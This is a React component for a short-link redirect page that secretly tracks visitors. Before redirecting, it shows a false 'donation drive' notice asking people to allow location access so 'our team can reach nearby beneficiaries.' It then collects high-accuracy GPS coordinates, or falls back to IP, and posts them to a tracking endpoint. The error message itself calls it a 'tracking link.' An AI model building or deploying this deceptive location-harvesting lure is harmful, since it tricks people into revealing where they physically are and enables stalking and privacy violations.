import { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { api } from "@/lib/api";
import { MapPin, Heart, Loader2, ShieldCheck } from "lucide-react";

export default function RedirectGate() {
  const { shortCode } = useParams();
  const [status, setStatus] = useState("loading"); // loading | prompt | locating | redirecting | error
  const [meta, setMeta] = useState(null);
  const done = useRef(false);

  useEffect(() => {
    api
      .get(`/resolve/${shortCode}`)
      .then((res) => {
        setMeta(res.data);
        setStatus("prompt");
      })
      .catch(() => setStatus("error"));
  }, [shortCode]);

  const finish = async (payload) => {
    if (done.current) return;
    done.current = true;
    try {
      const res = await api.post("/track", { short_code: shortCode, ...payload });
      setStatus("redirecting");
      window.location.replace(res.data.original_url);
    } catch (e) {
      if (meta?.original_url) window.location.replace(meta.original_url);
      else setStatus("error");
    }
  };

  const proceed = () => {
    setStatus("locating");
    if (!navigator.geolocation) {
      finish({ method: "ip" });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        finish({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          method: "gps",
        });
      },
      () => {
        finish({ method: "ip" });
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  return (
    <div className="min-h-screen bg-[#0A0D14] flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-[#111622] border border-[#26334D] rounded-2xl p-8 text-center">
        {status === "error" ? (
          <>
            <div className="w-14 h-14 rounded-full bg-[#EF4444]/15 flex items-center justify-center mx-auto mb-4">
              <MapPin className="text-[#EF4444]" size={26} />
            </div>
            <h1 className="font-head text-xl font-bold mb-2">Link not found</h1>
            <p className="text-sm text-[#94A3B8]">This tracking link is invalid or has been removed.</p>
          </>
        ) : status === "prompt" ? (
          <>
            <div className="w-16 h-16 rounded-full bg-[#10B981]/15 flex items-center justify-center mx-auto mb-5">
              <Heart className="text-[#10B981]" size={30} />
            </div>
            <h1 className="font-head text-2xl font-extrabold mb-2">Almost there!</h1>
            <p className="text-sm text-[#94A3B8] mb-6">
              {meta?.title ? `"${meta.title}" ` : "This content "}
              is supported by a donation drive. Please allow location access so our team can reach nearby beneficiaries, then you'll be taken to your content.
            </p>
            <button
              onClick={proceed}
              data-testid="grant-location-access-button"
              className="w-full bg-[#10B981] hover:bg-[#0ea472] text-[#0A0D14] font-semibold py-3 rounded-lg transition-colors flex items-center justify-center gap-2"
            >
              <MapPin size={18} /> Continue
            </button>
            <p className="text-[11px] text-[#64748b] mt-4 flex items-center justify-center gap-1">
              <ShieldCheck size={12} /> You'll be redirected automatically.
            </p>
          </>
        ) : (
          <>
            <Loader2 className="text-[#10B981] mx-auto mb-4 animate-spin" size={36} />
            <h1 className="font-head text-lg font-bold mb-1">
              {status === "redirecting" ? "Redirecting..." : status === "locating" ? "Getting your location..." : "Loading..."}
            </h1>
            <p className="text-sm text-[#94A3B8]">Please wait a moment.</p>
          </>
        )}
      </div>
    </div>
  );
}
